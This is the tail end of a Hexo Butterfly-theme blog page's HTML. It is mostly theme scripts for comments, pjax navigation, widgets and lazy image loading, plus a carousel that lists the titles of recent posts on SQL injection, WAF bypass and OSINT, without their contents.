    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'iuIup4lvgEwLDu3U8Qc3GOXd-gzGzoHsz',
      appKey: 'Ls9mJKS2MmvbfsPbPCeb2cnA',
      placeholder: 'Please leave your footprints',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      master: '5671db8c5f953943b68468c62e317e7e,007d3a0fdf1072ff1db83a005457a3c9,503ee756200f9eba794e5467c89e98f8'.split(','),
      friends: ''.split(','),
      tagMeta: '博主,小伙伴,访客'.split(','),
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script src="/js/smooth-scrolling.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
  'title',
  '#config-diff',
  '#body-wrap',
  '#rightside-config-hide',
  '#rightside-config-show',
  '.js-pjax'
]

if (false) {
  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
}

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.removeEventListener('scroll', window.tocScrollFn)
  window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // Analytics
  if (false) {
    MtaH5.pgv()
  }

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/img/gif/loading4.gif" data-original="/img/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_injector_config();
  }
  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e2e31796.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/yunsuo.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-23</span><a class="blog-slider__title" href="post/e2e31796.html" alt="">WAF-Bypass之SQL注入绕过云锁</a><div class="blog-slider__text">本文主要介绍:如何科学地绕过云锁WAF</div><a class="blog-slider__button" href="post/e2e31796.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e1e1fb64.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/waf.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-14</span><a class="blog-slider__title" href="post/e1e1fb64.html" alt="">WAF-Bypass之WAF介绍与分析</a><div class="blog-slider__text">本文主要介绍:WAF的工作原理以及部署方式</div><a class="blog-slider__button" href="post/e1e1fb64.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/1853c6b8.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/pgsql.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-11</span><a class="blog-slider__title" href="post/1853c6b8.html" alt="">PostgreSQL数据库注入攻击方式</a><div class="blog-slider__text">本文主要介绍:PostgreSQL数据库的注入与提取利用</div><a class="blog-slider__button" href="post/1853c6b8.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/c2f49bfa.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/mysql.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-06</span><a class="blog-slider__title" href="post/c2f49bfa.html" alt="">MySQL数据库注入攻击方式</a><div class="blog-slider__text">本文主要介绍:MySQL数据库的注入与提取利用</div><a class="blog-slider__button" href="post/c2f49bfa.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/7544e3e7.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/google.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-05</span><a class="blog-slider__title" href="post/7544e3e7.html" alt="">开源情报与搜索引擎</a><div class="blog-slider__text">本文主要介绍:使用谷歌语法搜索公开信息，利用空间测绘引擎搜索资产，使用Python脚本简单编写被动信息收集的工具</div><a class="blog-slider__button" href="post/7544e3e7.html" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/js/swiper.min.js"></script><script defer data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper_init.js"></script><script defer src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --><script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html>